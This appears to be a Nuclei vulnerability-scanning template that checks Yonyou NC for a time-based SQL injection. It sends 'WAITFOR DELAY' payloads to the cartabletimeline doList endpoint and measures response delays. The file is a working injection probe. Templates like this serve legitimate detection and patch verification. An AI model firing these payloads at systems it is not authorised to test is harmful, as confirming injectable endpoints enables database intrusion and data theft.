id: poc-yaml-yongyou-cartabletimeline-sqli
info:
  name: Yonyou NC cartabletimeline SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    reference:
      - "title=Yonyou UAP"
    product: Yonyou NC

variables:
  t1: "{{rand_int(6,9)}}"
  t2: "{{to_number(t1) + 2}}"
  t3: "{{rand_int(1,4)}}"
  t4: "{{to_number(t3) + 2}}"

http:
  - raw:
      - |
        GET /portal/pt/cartabletimeline/doList?pageId=login&mtr=1)WAITFOR+DELAY+%270:0:{{t1}}%27--+ HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<?xml version='1.0' encoding='UTF-8"
          - "<data>"
        part: body
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - "duration >= to_number(t1) && duration <= to_number(t2)"

  - raw:
      - |
        GET /portal/pt/cartabletimeline/doList?pageId=login&mtr=1)WAITFOR+DELAY+%270:0:{{t3}}%27--+ HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<?xml version='1.0' encoding='UTF-8"
          - "<data>"
        part: body
      - type: status
        status:
          - 200
      - type: dsl
        dsl:
          - "duration >= to_number(t3) && duration <= to_number(t4)"
